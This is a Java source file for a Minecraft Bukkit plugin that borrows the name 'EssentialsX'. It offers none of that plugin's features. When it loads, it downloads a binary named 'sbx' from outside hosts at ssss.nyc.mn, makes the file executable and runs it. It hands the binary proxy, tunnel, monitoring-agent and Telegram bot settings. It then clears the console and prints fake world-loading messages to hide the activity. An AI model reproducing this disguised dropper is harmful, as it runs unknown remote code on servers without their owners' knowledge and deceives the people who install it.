package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    private Thread monitorThread;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // Start sbx
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            getLogger().warning("sbx process is already running");
            return;
        }
        
        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        // Set environment variables
        Map<String, String> env = pb.environment();
        env.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", "");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "false");
        
        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Load from .env file (optional)
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    
                    line = line.split(" #")[0].split(" //")[0].trim();
                    if (line.startsWith("export ")) {
                        line = line.substring(7).trim();
                    }
                    
                    String[] parts = line.split("=", 2);
                    if (parts.length == 2) {
                        String key = parts[0].trim();
                        String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                        
                        if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                            env.put(key, value);
                        }
                    }
                }
            } catch (IOException e) {
                getLogger().warning("Error reading .env file: " + e.getMessage());
            }
        }
        
        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        // Start a monitor thread to log when process exits
        startProcessMonitor();
        
        // getLogger().info("sbx started successfully");
        
        // sleep 20 seconds
        try {
            Thread.sleep(20000);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
        
        // 清理日志
        clearConsole();
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 5%");
        getLogger().info("Preparing spawn area: 10%");
        getLogger().info("Preparing spawn area: 20%");
        getLogger().info("Preparing spawn area: 30%");
        getLogger().info("Preparing spawn area: 80%");
        getLogger().info("Preparing spawn area: 85%");
        getLogger().info("Preparing spawn area: 90%");
        getLogger().info("Preparing spawn area: 95%");
        getLogger().info("Preparing spawn area: 99%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                getLogger().info("sbx started");
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "SBX-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();
            
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
